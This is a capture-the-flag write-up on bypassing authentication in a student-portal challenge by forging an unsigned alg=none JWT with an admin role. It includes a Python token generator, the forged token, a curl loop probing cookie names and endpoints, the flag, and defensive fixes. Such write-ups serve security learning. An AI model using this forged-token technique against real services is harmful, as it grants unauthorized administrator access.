# Développeur mbw9: JWT Rookie

![Category](https://img.shields.io/badge/Category-Web-2563eb?style=flat-square)
![Bug](https://img.shields.io/badge/Bug-JWT%20alg%3Dnone-dc2626?style=flat-square)
![Impact](https://img.shields.io/badge/Impact-Auth%20Bypass-f59e0b?style=flat-square)
![Target](https://img.shields.io/badge/Target-Student%20Portal-0f766e?style=flat-square)

> Objective: forge an unsigned administrator JWT and identify the cookie/path combination that reveals the flag.

## Executive Summary

The challenge presented an ENSA student portal with a source-code comment hinting at an authentication bypass. Normal login attempts failed and no valid JWT was issued by the server.

Because the challenge description mentioned JWT misconfiguration, the most direct hypothesis was that the application trusted client-provided JWTs. A forged `alg=none` token with an admin role was accepted when placed in the `session` cookie and sent to `/dashboard`.

## Challenge Clues

| Source | Clue |
| --- | --- |
| HTML source | `TODO: fix auth bypass before go-live` |
| Statement | JWT misconfiguration |
| Login behavior | Invalid credentials only, no useful cookie |
| Successful vector | Unsigned admin JWT in `session` cookie |

Suspicious source comment:

```html
<!-- TODO: fix auth bypass before go-live -->
```

Login form:

```html
<form method="POST" action="/login">
```

Failed login response:

```html
<div class="err">Identifiants incorrects.</div>
```

## Attack Path

| Step | Action | Result |
| --- | --- | --- |
| 1 | Inspect page source | Auth bypass hint found |
| 2 | Test normal login | No credentials worked |
| 3 | Build `alg=none` JWT | Unsigned admin token created |
| 4 | Fuzz cookie names | `session` identified |
| 5 | Fuzz endpoints | `/dashboard` revealed flag |
| 6 | Extract flag | Challenge solved |

## 1. Hypothesis

The key clue was:

```html
<!-- TODO: fix auth bypass before go-live -->
```

Combined with the JWT hint from the statement, this suggested one of two possibilities:

| Possibility | Reason |
| --- | --- |
| Authentication bypass | Explicit TODO comment |
| Client-trusted JWT | JWT misconfiguration hint |

Because the login route did not issue a useful JWT, the next step was to provide one manually.

## 2. Exploitation: `alg=none`

The server accepted JWTs using:

```json
{
  "alg": "none"
}
```

This disables signature verification if the backend implementation trusts the token header.

Forged payload:

```json
{
  "username": "admin",
  "role": "admin"
}
```

## 3. JWT Generation

```bash
python3 - <<'PY'
import base64

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64(b'{"alg":"none","typ":"JWT"}')
payload = b64(b'{"username":"admin","role":"admin"}')

print(f"{header}.{payload}.")
PY
```

Generated token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

The trailing dot is important because the signature segment is empty.

## 4. Finding the Correct Cookie and Endpoint

Multiple cookie names and endpoints were tested:

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'

for c in token jwt session auth; do
  for p in / /admin /dashboard /profile /flag; do
    echo "=== cookie=$c path=$p ==="

    curl -s "https://csia-ctf26-jwt-rookie.chals.io$p" \
      -H "Cookie: $c=$TOKEN" | \
      grep -Eo 'CSIA\{[^}]+\}|flag[^<]*|admin[^<]*'
  done
done
```

Interesting result:

```text
=== cookie=session path=/dashboard ===
flag">CSIA{jwt_n0n3_alg_byp4ss}
```

The working combination was:

| Parameter | Value |
| --- | --- |
| Cookie name | `session` |
| Endpoint | `/dashboard` |

## Flag

```text
CSIA{jwt_n0n3_alg_byp4ss}
```

## Root Cause

The application accepted unsigned JWTs:

```json
"alg": "none"
```

Impact:

- no signature verification
- attacker-controlled payload
- role escalation to `admin`
- authentication bypass

## Lessons Learned

| Weakness | Defensive fix |
| --- | --- |
| `alg=none` accepted | Reject unsigned JWTs |
| JWT algorithm trusted from header | Enforce allowed algorithms server-side |
| Role stored client-side | Validate authorization server-side |
| Unknown cookie name slowed exploitation | Use systematic cookie/endpoint testing |

